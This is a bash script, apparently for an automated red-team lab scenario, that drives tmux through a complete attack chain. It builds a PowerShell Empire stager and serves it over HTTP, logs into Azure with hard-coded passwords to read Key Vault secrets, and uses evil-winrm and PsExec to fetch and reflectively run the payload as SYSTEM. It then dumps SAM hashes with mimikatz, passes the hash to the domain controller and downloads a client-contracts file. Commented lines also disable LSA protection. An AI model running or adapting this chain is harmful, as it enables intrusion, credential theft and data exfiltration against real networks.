#!/bin/bash

SESSION_NAME="Scenario-2"
LOG_BASE="/home/kaliadmin/logs"


mkdir /home/kaliadmin/payloads
mkdir $LOG_BASE


LOG_FILE0="$LOG_BASE/$SESSION_NAME-0.log"
LOG_FILE1="$LOG_BASE/$SESSION_NAME-1.log"
LOG_FILE2="$LOG_BASE/$SESSION_NAME-2.log"
LOG_FILE3="$LOG_BASE/$SESSION_NAME-3.log"
LOG_FILE4="$LOG_BASE/$SESSION_NAME-4.log"

tmux kill-session -t $SESSION_NAME
sleep 3
tmux new-session -d -s $SESSION_NAME

echo "" >  $LOG_FILE0
echo "" >  $LOG_FILE1
echo "" >  $LOG_FILE2
echo "" >  $LOG_FILE3
echo "" >  $LOG_FILE4

tmux pipe-pane -t $SESSION_NAME:0 'cat >> '"$LOG_FILE0"
tmux send-keys -t $SESSION_NAME:0 "sudo powershell-empire server" 
sleep 2
tmux send-keys -t $SESSION_NAME:0 C-m
/home/kaliadmin/wait_for_prompt.exp "http://0.0.0.0:1337" $SESSION_NAME:0

sleep 3

tmux new-window -t $SESSION_NAME -n "Empire Client"
tmux pipe-pane -t $SESSION_NAME:1 'cat >> '"$LOG_FILE1"

tmux send-keys -t $SESSION_NAME:1 "sudo powershell-empire client" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "uselistener http" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Host http://server_ip_1:80" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Port 80" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "usestager windows_csharp_exe" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Listener http" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set OutFile /home/kaliadmin/payloads/Scenario2.exe" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 3
cp /var/lib/powershell-empire/empire/client/generated-stagers/Scenario2.exe /home/kaliadmin/payloads/Scenario2.exe



tmux new-window -t $SESSION_NAME -n "Hosting Payload Web Server"
tmux pipe-pane -t $SESSION_NAME:2 'cat >> '"$LOG_FILE2"
tmux send-keys -t $SESSION_NAME:2 "cd /home/kaliadmin/payloads" 
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

tmux send-keys -t $SESSION_NAME:2 "python3 -m http.server 8081" 
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

read -p "Do you want to continue? (Y/N): " answer
if [[ "$answer" != "Y" && "$answer" != "y" ]]; then
    echo "Exiting script."
    exit 1
fi

tmux new-window -t $SESSION_NAME -n "Azure - Joff Thyer"
tmux pipe-pane -t $SESSION_NAME:3 'cat >> '"$LOG_FILE3"
tmux send-keys -t $SESSION_NAME:3 'cd /home/kaliadmin; mkdir Scenario-2; cd Scenario-2' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
sleep 3


tmux send-keys -t $SESSION_NAME:3 'sudo docker run -it mcr.microsoft.com/azure-cli:cbl-mariner2.0' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux send-keys -t $SESSION_NAME:3 'az login -u JoffThyer@sarfarazahamed2018gmail.onmicrosoft.com -p P@ssw0rd!' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux send-keys -t $SESSION_NAME:3 'az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --output table' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault list --query "[].name" -o tsv' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault secret list --vault-name "IT-KeyVault-Dev" --query "[].name" -o tsv' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault key list --vault-name "IT-KeyVault-Dev" --query "[].name" -o tsv' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault certificate list --vault-name "IT-KeyVault-Dev" --query "[].name" -o tsv' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault secret show --vault-name "IT-KeyVault-Dev" --name "csrptimmedin" --query "value" -o tsv' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault secret show --vault-name "IT-KeyVault-Dev" --name "johnstrandadmin" --query "value" -o tsv' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux send-keys -t $SESSION_NAME:3 'az login -u JohnStrandAdmin@sarfarazahamed2018gmail.onmicrosoft.com -p P@ssw0rd1!' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux send-keys -t $SESSION_NAME:3 'az login -u JohnStrandAdmin@sarfarazahamed2018gmail.onmicrosoft.com -p P@ssw0rd1!' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:3


sleep 3

tmux new-window -t $SESSION_NAME -n "Evil-Winrm - Tim Medin"
tmux pipe-pane -t $SESSION_NAME:4 'cat >> '"$LOG_FILE4"

tmux send-keys -t $SESSION_NAME:4 "evil-winrm -i 192.168.1.3 -u 'csrp\TimMedin' -p 'P@ssw0rd!'" 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 "whoami" 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 "hostname" 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 'Set-Content -Path .\run.ps1 -Value "[System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri http://server_ip:8081/Scenario2.exe -UseBasicParsing).Content).EntryPoint.Invoke([DBNull]::Value, @())" -Encoding UTF8' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 'Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\TimMedin\Documents\PSTools.zip"' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 'Expand-Archive -Path "C:\Users\TimMedin\Documents\PSTools.zip" -DestinationPath "C:\Users\TimMedin\Documents"' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\TimMedin\Documents\run.ps1" -accepteula' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux select-window -t $SESSION_NAME:1

tmux send-keys -t $SESSION_NAME:1 "agents" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "interact " 
sleep 2

tmux send-keys -t $SESSION_NAME:1 Down 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 3
tmux send-keys -t $SESSION_NAME:1 "usemodule powershell_credentials_mimikatz_sam" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_credentials_mimikatz_sam) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 15

hash=$(cat logs/Scenario-2-1.log | grep "user_administrator" -A1 | grep "NTLM" | awk '{print $3}')
echo $hash
# tmux select-window -t $SESSION_NAME:4

sleep 2


tmux send-keys -t $SESSION_NAME:1 "usemodule powershell_lateral_movement_invoke_smbexec" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3


tmux send-keys -t $SESSION_NAME:1 "set ComputerName CSRP-DC" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Username user_administrator" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Hash $hash" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Listener http" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3

agent=$(cat logs/Scenario-2-1.log | grep "checked in" | tail -1 | awk '{print $15}')
echo $agent

sleep 3

tmux send-keys -t $SESSION_NAME:1 "agents" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "interact $agent" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "shell" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "dir C:\Users\Public\Documents" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "exit" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 'download "C:\Users\Public\Documents\Top_Clients_Contracts.xlsx"' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

echo "Reached the end."










# tmux send-keys -t "$SESSION_NAME:4" C-c "y" C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4


# tmux send-keys -t $SESSION_NAME:4 "evil-winrm -i 192.168.1.3 -u 'csrp\TimMedin' -p 'P@ssw0rd!'" C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4


# sleep 7

# tmux send-keys -t $SESSION_NAME:4 'Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -Property SecurityServicesConfigured, SecurityServicesRunning' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

# sleep 7

# tmux send-keys -t $SESSION_NAME:4 'Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL"' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

# sleep 7

# tmux send-keys -t $SESSION_NAME:4 'Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

# sleep 7

# tmux send-keys -t $SESSION_NAME:4 'Restart-Computer -Force' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

# sleep 7

# tmux send-keys -t $SESSION_NAME:4 C-c

# sleep 7

# tmux send-keys -t $SESSION_NAME:4 "y" C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4

# sleep 7

# tmux select-window -t $SESSION_NAME:1

# tmux send-keys -t $SESSION_NAME:1 "agents" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "kill all" C-m

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "y" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

# tmux select-window -t $SESSION_NAME:4

# tmux send-keys -t $SESSION_NAME:4 "evil-winrm -i 192.168.1.3 -u 'csrp\TimMedin' -p 'P@ssw0rd!'" C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

# tmux send-keys -t $SESSION_NAME:4 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\TimMedin\Documents\run.ps1" -accepteula' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

# tmux select-window -t $SESSION_NAME:1

# tmux send-keys -t $SESSION_NAME:1 "agents" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "interact " 
# sleep 1

# tmux send-keys -t $SESSION_NAME:1 Down C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "usemodule powershell_credentials_mimikatz_logonpasswords" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_credentials_mimikatz_logonpasswords) >" $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "execute" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1



# tmux send-keys -t $SESSION_NAME:4 "exit" C-m


